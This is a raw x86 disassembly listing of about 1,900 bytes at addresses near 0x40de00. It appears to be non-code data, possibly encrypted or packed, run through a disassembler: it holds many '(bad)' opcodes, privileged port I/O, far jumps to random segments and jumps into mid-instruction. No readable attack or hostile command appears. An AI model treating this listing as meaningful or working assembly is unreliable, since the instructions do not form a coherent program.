  40ddfd:	mov    al,ds:0x2423b070
  40de02:	sub    eax,0xc1d06f57
  40de07:	sub    al,0xeb
  40de09:	and    ebp,ebp
  40de0b:	or     edx,DWORD PTR [esi-0x44]
  40de0e:	mov    DWORD PTR [eax-0x12],ebx
  40de11:	push   ecx
  40de12:	mov    BYTE PTR [esi+eiz*1],cl
  40de15:	xor    dh,0xd6
  40de18:	out    0xdc,al
  40de1a:	xor    al,0xce
  40de1c:	call   0xcc23:0x8dd8ed3d
  40de23:	int3   
  40de24:	retf   0x606f
  40de27:	dec    edx
  40de28:	push   eax
  40de29:	cli    
  40de2a:	test   BYTE PTR [ebx+edi*1+0x79],al
  40de2e:	mov    edx,0x6fda4492
  40de33:	add    DWORD PTR [edx-0x53],ebx
  40de36:	mov    dl,0x19
  40de38:	bswap  esi
  40de3a:	xchg   BYTE PTR [edi+0x1c],bl
  40de3d:	fisttp WORD PTR [eax-0x6b]
  40de40:	jbe    0x40ddf1
  40de42:	stos   BYTE PTR es:[edi],al
  40de43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de44:	and    bh,BYTE PTR [esi+0x22]
  40de47:	xor    eax,0xdbf46d73
  40de4c:	jmp    0xbf26:0x5b7de412
  40de53:	dec    edx
  40de54:	adc    DWORD PTR [ecx+0x64],edx
  40de57:	inc    esi
  40de58:	mov    dl,0xb1
  40de5a:	outs   dx,BYTE PTR ds:[esi]
  40de5b:	sbb    al,0x71
  40de5d:	sbb    ebx,DWORD PTR [esi-0x3f]
  40de60:	pop    esp
  40de61:	repnz ds adc eax,0x2b2a98ef
  40de68:	sbb    BYTE PTR [ebx+0x4bbad429],0xd6
  40de6f:	adc    BYTE PTR [esi-0x43],0x76
  40de73:	pop    ds
  40de74:	into   
  40de75:	mov    dh,0x63
  40de77:	repz lock mov ds:0x6c01fed0,al
  40de7e:	push   DWORD PTR [ecx]
  40de80:	mov    fs:0x55a30465,eax
  40de86:	xchg   edx,ecx
  40de88:	jnp    0x40de17
  40de8a:	xlat   BYTE PTR ds:[ebx]
  40de8b:	dec    esi
  40de8c:	dec    edi
  40de8d:	push   edx
  40de8e:	fsub   DWORD PTR [esi+ecx*4-0x40]
  40de92:	mov    al,0x8b
  40de94:	sti    
  40de95:	retf   0xeb28
  40de98:	sbb    eax,0x635fe551
  40de9d:	jne    0x40de81
  40de9f:	aad    0x6f
  40dea1:	es mov ecx,0x4f8bade2
  40dea7:	xchg   ebx,eax
  40dea8:	neg    DWORD PTR [ecx-0x45]
  40deab:	or     al,0x69
  40dead:	loopne 0x40de7a
  40deaf:	jg     0x40dea5
  40deb1:	outs   dx,BYTE PTR ds:[esi]
  40deb2:	pop    es
  40deb3:	jb     0x40de37
  40deb5:	outs   dx,DWORD PTR ds:[esi]
  40deb6:	add    ch,BYTE PTR [edi-0x24]
  40deb9:	mov    dh,0x95
  40debb:	bound  ebx,QWORD PTR [ebp+0x6feac0e9]
  40dec1:	pop    ds
  40dec2:	jne    0x40df28
  40dec4:	scas   al,BYTE PTR es:[edi]
  40dec5:	aaa    
  40dec6:	or     DWORD PTR [esi+0xf],eax
  40dec9:	dec    eax
  40deca:	lods   al,BYTE PTR ds:[esi]
  40decb:	rcl    BYTE PTR [eax+ecx*8],0x5a
  40decf:	add    al,0x16
  40ded1:	dec    edx
  40ded2:	(bad)  
  40ded3:	lock mov cs,WORD PTR [edi+0x7cf058d0]
  40deda:	jle    0x40df06
  40dedc:	sub    al,0x59
  40dede:	jmp    0x975f20fb
  40dee3:	imul   ecx,DWORD PTR [esi+0x376884d7],0x1
  40deea:	cmp    BYTE PTR [eax],ah
  40deec:	push   eax
  40deed:	mov    ds:0x95d98340,al
  40def2:	das    
  40def3:	enter  0x5707,0xf6
  40def7:	or     eax,0xcf3072bc
  40defc:	enter  0xf00d,0x99
  40df00:	icebp  
  40df01:	add    al,0xbf
  40df03:	jecxz  0x40deab
  40df05:	inc    edx
  40df06:	cmp    DWORD PTR [edi+0x66],0x99a39330
  40df0d:	in     al,dx
  40df0e:	mov    cl,0x16
  40df10:	pop    ecx
  40df11:	xchg   ebp,eax
  40df12:	fwait
  40df13:	aaa    
  40df14:	jl     0x40df88
  40df16:	push   0xffffffa8
  40df18:	sti    
  40df19:	cmc    
  40df1a:	cli    
  40df1b:	cmp    eax,0xb15c7ef3
  40df20:	jne    0x40df11
  40df22:	dec    ebx
  40df23:	adc    eax,0x100e767e
  40df28:	ja     0x40df73
  40df2a:	not    BYTE PTR [ebp+0x7]
  40df2d:	bound  esp,QWORD PTR [edi]
  40df2f:	sbb    al,0xb2
  40df31:	mov    al,0x6e
  40df33:	in     eax,0xf0
  40df35:	fsubr  QWORD PTR [ebx-0x280af276]
  40df3b:	push   esp
  40df3c:	shr    DWORD PTR [edi],1
  40df3e:	add    ebp,DWORD PTR [eax-0x6230b2f4]
  40df44:	dec    ebx
  40df45:	daa    
  40df46:	test   BYTE PTR [edi],bh
  40df48:	push   esi
  40df49:	push   eax
  40df4a:	add    al,0x97
  40df4c:	lahf   
  40df4d:	pop    ebp
  40df4e:	inc    esp
  40df4f:	inc    ebx
  40df50:	push   eax
  40df51:	xor    ebp,edi
  40df53:	iret   
  40df54:	or     DWORD PTR ds:0xeb84fb79,esi
  40df5a:	sbb    DWORD PTR [edi],esp
  40df5c:	lods   eax,DWORD PTR ds:[esi]
  40df5d:	and    DWORD PTR [esi],ebx
  40df5f:	jmp    0x1f3d:0xadfe1570
  40df66:	dec    edi
  40df67:	xor    BYTE PTR [ecx+0x1c],bh
  40df6a:	aad    0x45
  40df6c:	or     eax,0x3abdb769
  40df71:	(bad)  
  40df73:	mov    ds:0x35f236f,eax
  40df78:	xchg   edi,eax
  40df79:	jbe    0x40df89
  40df7b:	adc    eax,0xc7e192c2
  40df80:	ds mov edi,0x6c09276a
  40df86:	mov    bh,0x3e
  40df88:	adc    DWORD PTR [ebp-0x210c2a36],ecx
  40df8e:	iret   
  40df8f:	dec    BYTE PTR [ebp-0x1d]
  40df92:	sub    DWORD PTR [eax+eax*2-0x6],0xffffffdc
  40df97:	jge    0x40df1d
  40df99:	mov    dh,0x6
  40df9b:	lock add DWORD PTR [eax-0x77],eax
  40df9f:	repnz scas eax,DWORD PTR es:[edi]
  40dfa1:	jmp    0xe022d787
  40dfa6:	repnz sahf 
  40dfa8:	xchg   ebp,eax
  40dfa9:	mov    ah,0xe9
  40dfab:	shl    BYTE PTR [ecx+0x61155f19],cl
  40dfb1:	(bad)  
  40dfb2:	out    0x6b,al
  40dfb4:	outs   dx,BYTE PTR ds:[esi]
  40dfb5:	add    ch,BYTE PTR [edi+0x46477d5a]
  40dfbb:	inc    eax
  40dfbc:	out    dx,al
  40dfbd:	mov    eax,edi
  40dfbf:	or     dl,BYTE PTR [esi+eax*4+0x6a]
  40dfc3:	mov    ah,0xe1
  40dfc5:	xor    eax,0x732e7abb
  40dfca:	retf   0x4773
  40dfcd:	imul   edi,DWORD PTR [esi-0x6c6d3f33],0xa259a522
  40dfd7:	es xchg ebx,eax
  40dfd9:	mov    dh,0x54
  40dfdb:	cmp    cl,ch
  40dfdd:	in     eax,0xbd
  40dfdf:	jnp    0x40dfbe
  40dfe1:	std    
  40dfe2:	test   DWORD PTR [ebx+0x42d5d847],ecx
  40dfe8:	adc    DWORD PTR [ebx+0x1f],edi
  40dfeb:	pop    eax
  40dfec:	cmp    DWORD PTR [ebx+0x584161f],ebx
  40dff2:	jb     0x40df82
  40dff4:	sar    DWORD PTR [eax],0x1c
  40dff7:	dec    ebx
  40dff8:	ds scas al,BYTE PTR es:[edi]
  40dffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dffb:	push   ecx
  40dffc:	(bad)  
  40dffd:	fld    TBYTE PTR [ebp-0x662a2c58]
  40e003:	rcl    DWORD PTR [ecx+0x16],1
  40e006:	fisub  DWORD PTR [esi]
  40e008:	stos   DWORD PTR es:[edi],eax
  40e009:	sbb    BYTE PTR [esi+ebx*4-0x33],cl
  40e00d:	sub    DWORD PTR [edx-0x74],ebp
  40e010:	out    0x77,al
  40e012:	xchg   ebx,eax
  40e013:	mov    ds:0xec30a36a,eax
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	mov    WORD PTR [edi-0x58d14af2],ds
  40e01f:	jle    0x40dfb4
  40e021:	sbb    ah,BYTE PTR [eax]
  40e023:	or     cl,bl
  40e025:	mov    ds:0xa4fffe1f,eax
  40e02a:	sbb    al,0x20
  40e02c:	push   es
  40e02d:	sbb    edx,esi
  40e02f:	sub    BYTE PTR [esi],bh
  40e031:	push   0x62cf4267
  40e036:	add    DWORD PTR cs:[edi+0x7a],0x4bbec545
  40e03e:	or     ah,ah
  40e040:	repnz fnstsw WORD PTR [edx-0x63c8009f]
  40e047:	es (bad) 
  40e049:	into   
  40e04a:	jecxz  0x40e02c
  40e04c:	ja     0x40dfdf
  40e04e:	jmp    0x88ae4bc6
  40e053:	or     eax,0xd8bb81ff
  40e058:	jae    0x40e0b9
  40e05a:	mov    ds:0x79fa73c7,al
  40e05f:	jns    0x40e0d4
  40e061:	repz aad 0x2f
  40e064:	mov    al,ds:0xba79e1fe
  40e069:	inc    eax
  40e06a:	iret   
  40e06b:	(bad)  
  40e06c:	mul    BYTE PTR [edi+esi*2]
  40e06f:	icebp  
  40e070:	mov    dh,0x10
  40e072:	ror    DWORD PTR [edi+ecx*8+0x5a22bb3f],0x37
  40e07a:	scas   al,BYTE PTR es:[edi]
  40e07b:	and    eax,0xe2d21b96
  40e080:	xchg   edi,eax
  40e081:	lea    edi,[esi-0x61446881]
  40e087:	push   ds
  40e088:	std    
  40e089:	int    0xbb
  40e08b:	xchg   esp,eax
  40e08c:	rcr    DWORD PTR [eax],1
  40e08e:	dec    ecx
  40e08f:	out    0xbc,eax
  40e091:	jo     0x40e0f9
  40e093:	imul   esp,DWORD PTR [ecx-0x26cad13a],0x3f7aff47
  40e09d:	loope  0x40e079
  40e09f:	pop    ebp
  40e0a0:	sbb    DWORD PTR [ecx],0xffffff94
  40e0a3:	push   0xfffffff2
  40e0a5:	jecxz  0x40e05f
  40e0a7:	sbb    al,ah
  40e0a9:	cli    
  40e0aa:	sub    eax,0x92d080a2
  40e0af:	sub    ebp,DWORD PTR [eax-0x7]
  40e0b2:	das    
  40e0b3:	xor    ebp,edx
  40e0b5:	daa    
  40e0b6:	push   edx
  40e0b7:	pushf  
  40e0b8:	dec    ebp
  40e0b9:	in     eax,0x72
  40e0bb:	fist   WORD PTR [edx+0x52]
  40e0be:	pop    ebx
  40e0bf:	add    ebx,DWORD PTR [esi]
  40e0c1:	jle    0x40e106
  40e0c3:	les    edi,FWORD PTR [esi-0xc]
  40e0c6:	xor    DWORD PTR [ebx+0x55],edx
  40e0c9:	jmp    0x40e0e1
  40e0cb:	scas   eax,DWORD PTR es:[edi]
  40e0cc:	aad    0xe3
  40e0ce:	outs   dx,BYTE PTR ds:[esi]
  40e0cf:	mov    bl,0x7
  40e0d1:	aad    0x17
  40e0d3:	xchg   edx,eax
  40e0d4:	pop    esp
  40e0d5:	xlat   BYTE PTR ds:[ebx]
  40e0d6:	jb     0x40e09e
  40e0d8:	retf   
  40e0d9:	mov    ds:0xa3ddba88,al
  40e0de:	push   ds
  40e0df:	adc    dh,BYTE PTR [ebx+0x95b41fc]
  40e0e5:	mov    esp,0xe2c7c130
  40e0ea:	js     0x40e128
  40e0ec:	dec    ebp
  40e0ed:	add    edi,DWORD PTR [esp+ebp*2]
  40e0f0:	imul   ecx,DWORD PTR [eax],0x5
  40e0f3:	stos   BYTE PTR es:[edi],al
  40e0f4:	rcr    dl,1
  40e0f6:	push   esp
  40e0f7:	mov    ebp,0x35d11faf
  40e0fc:	jnp    0x40e13b
  40e0fe:	pop    esi
  40e0ff:	sbb    ch,BYTE PTR ds:0x3cc94265
  40e105:	test   DWORD PTR [esi],0x217af2df
  40e10b:	(bad)  
  40e10c:	jmp    0x40e142
  40e10e:	and    edx,DWORD PTR ds:0xf7e57846
  40e114:	dec    ecx
  40e115:	enter  0x2b7f,0x5a
  40e119:	stos   BYTE PTR es:[edi],al
  40e11a:	pop    es
  40e11b:	sahf   
  40e11c:	lds    edx,FWORD PTR [edi-0x10]
  40e11f:	mov    WORD PTR [eax+0x2a85467],es
  40e125:	pop    ebx
  40e126:	adc    eax,0x1f36eca7
  40e12b:	js     0x40e194
  40e12d:	add    BYTE PTR [ecx+ebx*4],dh
  40e130:	or     al,0x17
  40e132:	mov    edi,DWORD PTR [ebp-0x1c]
  40e135:	pop    edi
  40e136:	mov    DWORD PTR [eax-0x7c],eax
  40e139:	ret    
  40e13a:	inc    esi
  40e13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13c:	push   edx
  40e13d:	jb     0x40e178
  40e13f:	cmc    
  40e140:	stc    
  40e141:	daa    
  40e142:	addr16 push ds
  40e144:	icebp  
  40e145:	ins    DWORD PTR es:[edi],dx
  40e146:	cmp    eax,0xfa67b5b1
  40e14b:	mov    esp,0xce2fe987
  40e150:	sub    DWORD PTR [ecx+0x187caa26],esi
  40e156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e157:	aam    0x2a
  40e159:	cmp    eax,0xe76af651
  40e15e:	mov    ah,0xfb
  40e160:	mov    edi,0xb724c818
  40e165:	and    BYTE PTR ds:0xd6f3515d,dl
  40e16b:	or     DWORD PTR [edi+0x20],esp
  40e16e:	out    0x8a,eax
  40e170:	std    
  40e171:	loope  0x40e1b1
  40e173:	mov    WORD PTR [ecx],gs
  40e175:	psraw  mm3,mm6
  40e178:	aam    0xb
  40e17a:	jbe    0x40e18b
  40e17c:	mov    dl,BYTE PTR [ecx-0x40a0a0bf]
  40e182:	cdq    
  40e183:	popf   
  40e184:	mov    ds:0xca1c0d5,al
  40e189:	push   edx
  40e18a:	fst    QWORD PTR [esi]
  40e18c:	es sbb eax,0x47e01acf
  40e193:	jae    0x40e1a3
  40e195:	xchg   edi,eax
  40e196:	adc    ch,cl
  40e198:	cli    
  40e199:	pop    esp
  40e19a:	js     0x40e172
  40e19c:	pop    ecx
  40e19d:	aad    0xbd
  40e19f:	hlt    
  40e1a0:	add    DWORD PTR [edx+0xa],eax
  40e1a3:	mov    al,0x14
  40e1a5:	dec    esp
  40e1a6:	mov    bh,0xc9
  40e1a8:	rol    BYTE PTR [edi+0x7],0xf8
  40e1ac:	cwde   
  40e1ad:	(bad)  
  40e1ae:	mov    bh,0xc7
  40e1b1:	fsubr  QWORD PTR [esi+0x6bb7c8b3]
  40e1b7:	mov    cl,0x94
  40e1b9:	jns    0x40e162
  40e1bb:	dec    eax
  40e1bc:	dec    edx
  40e1bd:	cwde   
  40e1be:	leave  
  40e1bf:	cwde   
  40e1c0:	cli    
  40e1c1:	imul   ebp,DWORD PTR [ecx+0xf],0x5e8f8b0b
  40e1c8:	and    BYTE PTR [ebx],ah
  40e1ca:	xchg   ch,ch
  40e1cc:	scas   al,BYTE PTR es:[edi]
  40e1cd:	or     al,0xca
  40e1cf:	int    0x17
  40e1d1:	jno    0x40e1cb
  40e1d3:	repz pop edi
  40e1d5:	das    
  40e1d6:	sar    BYTE PTR [ecx-0x757bac05],1
  40e1dc:	out    dx,al
  40e1dd:	add    eax,0x9997018
  40e1e2:	imul   edx,DWORD PTR [esi+0x3104707c],0xc
  40e1e9:	enter  0x7caf,0x86
  40e1ed:	fwait
  40e1ee:	or     BYTE PTR [ecx+0x26af46c],ch
  40e1f4:	sub    esp,DWORD PTR [esi]
  40e1f6:	mov    edi,0x3e058093
  40e1fb:	mov    ch,0x7b
  40e1fd:	je     0x40e254
  40e1ff:	fild   WORD PTR ds:0x45249b0e
  40e205:	lea    edi,[edx+0x19]
  40e208:	cdq    
  40e209:	add    ah,cl
  40e20b:	cmp    DWORD PTR [ebx],edx
  40e20d:	add    BYTE PTR [edi+0x4a],0xb3
  40e211:	mov    dl,0xfa
  40e213:	les    edx,FWORD PTR ss:[edx]
  40e216:	inc    ebx
  40e217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e218:	rcl    DWORD PTR [eax],1
  40e21a:	mov    bl,BYTE PTR [edi]
  40e21c:	sub    eax,0xb135cb17
  40e221:	call   0x4c1cc765
  40e226:	inc    edx
  40e227:	mov    esi,0x50d079f6
  40e22c:	out    dx,eax
  40e22d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e22e:	sbb    ah,bl
  40e230:	jmp    0xd1471bbd
  40e235:	pop    eax
  40e236:	pop    ebx
  40e237:	mov    BYTE PTR [esi+edi*4+0x0],bh
  40e23b:	adc    DWORD PTR [eax-0x403c42df],ecx
  40e241:	pop    ds
  40e242:	xor    al,0x94
  40e244:	dec    esi
  40e245:	mov    DWORD PTR [edi-0x3b],edx
  40e248:	or     eax,0x161515a7
  40e24d:	imul   esi,esp,0xfb430801
  40e253:	xor    dh,BYTE PTR [ecx]
  40e255:	cwde   
  40e256:	ret    
  40e257:	into   
  40e258:	pop    ss
  40e259:	lock mov eax,ds:0x8e294c35
  40e25f:	lods   eax,DWORD PTR ds:[esi]
  40e260:	push   ecx
  40e261:	iret   
  40e262:	sbb    ah,dl
  40e264:	jg     0x40e229
  40e266:	or     WORD PTR [ecx+ebx*8+0x365c53de],di
  40e26e:	push   ds
  40e26f:	scas   eax,DWORD PTR es:[edi]
  40e270:	jl     0x40e282
  40e272:	pop    edx
  40e273:	xor    ebp,ebx
  40e275:	call   0x7b54bc13
  40e27a:	sub    DWORD PTR [eax+edi*8-0x7f],eax
  40e27e:	dec    eax
  40e27f:	mov    esi,0x56d98c8b
  40e284:	and    eax,0xf3485cc7
  40e289:	popf   
  40e28a:	jge    0x40e28f
  40e28c:	das    
  40e28d:	adc    DWORD PTR [ecx+0x48],esi
  40e290:	ins    BYTE PTR es:[edi],dx
  40e291:	fld    QWORD PTR [ebx+edi*8+0x25b11b7d]
  40e298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e299:	ss loope 0x40e24b
  40e29c:	daa    
  40e29d:	or     al,0xbe
  40e29f:	int    0x90
  40e2a1:	inc    ebp
  40e2a2:	outs   dx,DWORD PTR ds:[esi]
  40e2a3:	jb     0x40e2f4
  40e2a5:	pop    ds
  40e2a6:	sbb    eax,0x4d407402
  40e2ab:	mov    ds:0xb9525fa7,eax
  40e2b0:	jnp    0x40e2be
  40e2b2:	push   ebp
  40e2b3:	(bad)  
  40e2b5:	dec    ebx
  40e2b6:	jbe    0x40e26e
  40e2b8:	dec    edi
  40e2b9:	ds inc eax
  40e2bb:	cmp    al,0xb2
  40e2bd:	daa    
  40e2be:	pop    eax
  40e2bf:	adc    BYTE PTR [edi],ah
  40e2c1:	int    0x4a
  40e2c3:	leave  
  40e2c4:	lods   al,BYTE PTR ds:[esi]
  40e2c5:	mov    esi,0x381286fa
  40e2ca:	push   ecx
  40e2cb:	loopne 0x40e303
  40e2cd:	push   ds
  40e2ce:	cs call 0xe065:0xd9347c83
  40e2d6:	sub    bl,BYTE PTR [edx+0x5bf50ee6]
  40e2dc:	daa    
  40e2dd:	cld    
  40e2de:	jge    0x40e326
  40e2e0:	xchg   edi,eax
  40e2e1:	ret    0x3060
  40e2e4:	jle    0x40e2f3
  40e2e6:	cmp    DWORD PTR [eax+0x69],ebx
  40e2e9:	inc    ecx
  40e2ea:	scas   al,BYTE PTR es:[edi]
  40e2eb:	ins    DWORD PTR es:[edi],dx
  40e2ec:	scas   eax,DWORD PTR es:[edi]
  40e2ed:	cld    
  40e2ee:	aam    0x35
  40e2f0:	sub    esi,esp
  40e2f2:	addr16 or eax,edi
  40e2f5:	in     eax,0x38
  40e2f7:	mov    cl,0x10
  40e2f9:	dec    ebx
  40e2fa:	in     al,0xcc
  40e2fc:	xchg   esi,eax
  40e2fd:	add    bl,BYTE PTR [ecx+0x404a4026]
  40e303:	sbb    edx,DWORD PTR [ebx+0xe]
  40e306:	rol    DWORD PTR [ebx],0xb4
  40e309:	pop    esp
  40e30a:	push   ebp
  40e30b:	ss pop edx
  40e30d:	int    0x34
  40e30f:	das    
  40e310:	js     0x40e37e
  40e312:	aas    
  40e313:	mov    ds:0xbeaa5733,al
  40e318:	lahf   
  40e319:	leave  
  40e31a:	pop    ebx
  40e31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e31c:	lea    esp,[edx-0x1a]
  40e31f:	or     edx,ebx
  40e321:	jmp    0xdc261952
  40e326:	push   esp
  40e327:	jne    0x40e388
  40e329:	jl     0x40e311
  40e32b:	and    al,0x4b
  40e32d:	dec    edx
  40e32e:	jo     0x40e382
  40e330:	push   ebp
  40e331:	pop    esp
  40e332:	sar    BYTE PTR [edi],1
  40e334:	fs mov al,0xf2
  40e337:	and    eax,0xe2ed7e84
  40e33c:	push   ecx
  40e33d:	pop    ebp
  40e33e:	fdivr  DWORD PTR [ecx]
  40e340:	or     BYTE PTR [edx],cl
  40e342:	xor    dl,BYTE PTR [ecx+ebx*8-0xf]
  40e346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e347:	shl    DWORD PTR [ecx-0x69],1
  40e34a:	add    al,0x41
  40e34c:	jecxz  0x40e30d
  40e34e:	rol    DWORD PTR [ebx+eax*1+0x362fee4a],1
  40e355:	xchg   esi,eax
  40e356:	jecxz  0x40e3b0
  40e358:	mov    BYTE PTR [edi-0x5205e74f],ch
  40e35e:	lahf   
  40e35f:	dec    ebp
  40e360:	jbe    0x40e336
  40e362:	cdq    
  40e363:	retf   0x8bd8
  40e366:	push   edi
  40e367:	adc    bh,dh
  40e369:	xchg   ebx,eax
  40e36a:	daa    
  40e36b:	scas   eax,DWORD PTR es:[edi]
  40e36c:	mov    es,WORD PTR [esi-0x23]
  40e36f:	cmp    BYTE PTR [esi-0x77],ch
  40e372:	xchg   esi,eax
  40e373:	and    DWORD PTR [esi+0x5e],ecx
  40e376:	das    
  40e377:	(bad)
  40e37a:	stos   BYTE PTR es:[edi],al
  40e37b:	sbb    DWORD PTR [ebp-0x68],ebx
  40e37e:	or     esi,edi
  40e380:	mov    ds:0x5b4ac555,eax
  40e385:	jecxz  0x40e30e
  40e387:	pushf  
  40e388:	add    al,0x8a
  40e38a:	sub    eax,0x68c92ed7
  40e38f:	addr16 jae 0x40e409
  40e392:	and    al,0x84
  40e394:	xchg   ecx,eax
  40e395:	pop    esi
  40e396:	xor    BYTE PTR [ebp+0x32d9c24c],al
  40e39c:	data16 rcr dh,1
  40e39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3a0:	(bad)  
  40e3a1:	jmp    0x40e3bf
  40e3a3:	dec    edi
  40e3a4:	lock or DWORD PTR [bp-0x5b],0x67
  40e3aa:	mov    eax,ds
  40e3ac:	lea    esi,[edx]
  40e3ae:	inc    esp
  40e3af:	pop    ss
  40e3b0:	(bad)  
  40e3b1:	mov    esi,0x81a5d7f5
  40e3b6:	mov    eax,ds:0x8c4cf8a2
  40e3bb:	ficom  DWORD PTR ds:[ecx]
  40e3be:	dec    edi
  40e3bf:	call   0xe0ab:0x574eaaa9
  40e3c6:	cmp    DWORD PTR [edx],edi
  40e3c8:	dec    esi
  40e3c9:	or     al,0x76
  40e3cb:	sahf   
  40e3cc:	sub    DWORD PTR [ebx],0xf54a4c6e
  40e3d2:	jl     0x40e3ca
  40e3d4:	test   al,al
  40e3d6:	pop    es
  40e3d7:	inc    esi
  40e3d8:	add    eax,ebp
  40e3da:	(bad)  
  40e3db:	cmp    eax,0x423a29c8
  40e3e0:	xor    DWORD PTR [ebx+0x6a],ebp
  40e3e3:	iret   
  40e3e4:	scas   eax,DWORD PTR es:[edi]
  40e3e5:	xlat   BYTE PTR ds:[ebx]
  40e3e6:	(bad)  
  40e3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e8:	imul   ebp,edi,0xffffffe8
  40e3eb:	adc    al,0x52
  40e3ed:	in     eax,0xb1
  40e3ef:	into   
  40e3f0:	jae    0x40e457
  40e3f2:	mov    ss,WORD PTR [ecx+0x4f]
  40e3f5:	adc    BYTE PTR [bx+si],0x3a
  40e3f9:	scas   al,BYTE PTR es:[edi]
  40e3fa:	inc    esi
  40e3fb:	fstp   TBYTE PTR [eax]
  40e3fd:	jl     0x40e449
  40e3ff:	pop    esp
  40e400:	sub    edi,DWORD PTR [ebp+esi*1-0x1b7de0fd]
  40e407:	int3   
  40e408:	scas   al,BYTE PTR es:[edi]
  40e409:	in     al,dx
  40e40a:	repnz (bad) 
  40e40c:	popf   
  40e40d:	xor    eax,0xbf7460ab
  40e412:	xlat   BYTE PTR ds:[ebx]
  40e413:	xchg   edi,eax
  40e414:	mov    ebx,0xb8d061cc
  40e419:	or     esi,esp
  40e41b:	fiadd  WORD PTR [edx+0x5c869a6]
  40e421:	dec    esi
  40e422:	test   DWORD PTR [esi],0x607e85f
  40e428:	popf   
  40e429:	out    0x2d,al
  40e42b:	fwait
  40e42c:	fs xchg edi,eax
  40e42e:	xchg   ebp,eax
  40e42f:	mov    WORD PTR [edx+ebx*1-0x168b0b07],?
  40e436:	in     eax,0x62
  40e438:	cli    
  40e439:	mov    dh,0x68
  40e43b:	xor    BYTE PTR [ecx+ebx*4+0x8],cl
  40e43f:	not    DWORD PTR [ecx]
  40e441:	or     dl,BYTE PTR ds:0xc9ffa6
  40e447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e448:	push   eax
  40e449:	dec    edx
  40e44a:	popa   
  40e44b:	aaa    
  40e44c:	out    dx,eax
  40e44d:	dec    esp
  40e44e:	cwde   
  40e44f:	mov    al,0xab
  40e451:	ins    DWORD PTR es:[edi],dx
  40e452:	stc    
  40e453:	fnstsw WORD PTR [ecx+esi*2]
  40e456:	inc    edx
  40e457:	imul   esp,DWORD PTR [esi+0x4a],0x18687ee6
  40e45e:	dec    eax
  40e45f:	clc    
  40e460:	adc    DWORD PTR [eax-0x58],esi
  40e463:	stos   DWORD PTR es:[edi],eax
  40e464:	out    0x29,eax
  40e466:	rcr    DWORD PTR [edi],1
  40e468:	jno    0x40e414
  40e46a:	push   ecx
  40e46b:	cmp    eax,0xaad41971
  40e470:	push   0x2aa8cade
  40e475:	mov    cl,0x9
  40e477:	mov    esi,0x88224956
  40e47c:	dec    ebx
  40e47d:	icebp  
  40e47e:	jecxz  0x40e4b3
  40e480:	out    dx,eax
  40e481:	mov    ds:0x7a5a26,eax
  40e486:	pop    esi
  40e487:	popf   
  40e488:	mov    al,ds:0xc56bf36d
  40e48d:	mov    ch,0xd6
  40e48f:	adc    DWORD PTR [esi+edi*1],0xbe9fce47
  40e496:	(bad)  
  40e497:	cmp    edx,DWORD PTR [edi-0x106bf2c4]
  40e49d:	pop    ebp
  40e49e:	or     bl,BYTE PTR [edi-0xb]
  40e4a1:	call   0xb1de0379
  40e4a6:	je     0x40e478
  40e4a8:	sahf   
  40e4a9:	jnp    0x40e511
  40e4ab:	sbb    edi,DWORD PTR [ebx+ebx*1+0x42bba52c]
  40e4b2:	shl    BYTE PTR [ebx-0x34cd3fd5],cl
  40e4b8:	aad    0x43
  40e4ba:	cmp    al,0x29
  40e4bc:	inc    edi
  40e4bd:	shl    BYTE PTR [ecx-0x7ae762ff],1
  40e4c3:	imul   DWORD PTR [edi-0x64]
  40e4c6:	sbb    bh,BYTE PTR [eax]
  40e4c8:	add    DWORD PTR [ecx-0x4c1e8e9d],eax
  40e4ce:	dec    ecx
  40e4cf:	fldcw  WORD PTR [esi+0x28]
  40e4d2:	(bad)  
  40e4d3:	fisttp DWORD PTR [esi-0x455cb5f6]
  40e4d9:	pushf  
  40e4da:	std    
  40e4db:	sti    
  40e4dc:	xor    DWORD PTR [esi+0x5e],0x94728afb
  40e4e3:	mov    ds:0xcb43dfd3,eax
  40e4e8:	adc    BYTE PTR [esi+0x36ab8e4a],cl
  40e4ee:	popf   
  40e4ef:	jge    0x40e48e
  40e4f1:	aas    
  40e4f2:	dec    edi
  40e4f3:	mov    ch,0x7e
  40e4f5:	inc    esi
  40e4f6:	push   es
  40e4f7:	int3   
  40e4f8:	mov    ebx,0x608075a1
  40e4fd:	repnz push eax
  40e4ff:	adc    edi,DWORD PTR [esi]
  40e501:	fistp  WORD PTR [ebx-0x512680a4]
  40e507:	(bad)  
  40e508:	pop    edi
  40e509:	mov    eax,0xe4e08f6f
  40e50e:	inc    edi
  40e50f:	sbb    ah,dl
  40e511:	mov    ah,0x3b
  40e513:	fdecstp 
  40e515:	(bad)  
  40e516:	cmp    ah,ah
  40e518:	je     0x40e593
  40e51a:	cmp    cl,BYTE PTR [esi]
  40e51c:	and    eax,0xd800b19a
  40e521:	aas    
  40e522:	and    al,BYTE PTR [edi-0x57]
  40e525:	scas   al,BYTE PTR es:[edi]
  40e526:	setg   BYTE PTR [ebx+ecx*8-0x15]
  40e52b:	mov    eax,0x8cfcd338
  40e530:	sbb    eax,DWORD PTR [ebp+0x64b053a0]
  40e536:	or     cl,bl
  40e538:	gs pushf 
  40e53a:	popa   
  40e53b:	not    DWORD PTR [edx+0x5c]
  40e53e:	pop    esp
  40e53f:	mov    ebp,0x876b68e7
  40e544:	pop    es
  40e545:	sbb    eax,DWORD PTR [ebx-0x4e]
  40e548:	in     al,dx
  40e549:	cmp    al,0xac
  40e54b:	loope  0x40e5c6
  40e54d:	push   0x65
  40e54f:	jno    0x40e539
  40e551:	push   esi
  40e552:	pop    edx
  40e553:	arpl   WORD PTR [ebx+0x1e],bx
  40e556:	std    
  40e557:	sbb    dl,BYTE PTR [eax-0x7b]
  40e55a:	adc    eax,0x3d6226ff
  40e55f:	das    
  40e560:	sbb    al,0x72
  40e562:	int    0xb3
  40e564:	addr16 pop esp
  40e566:	das    
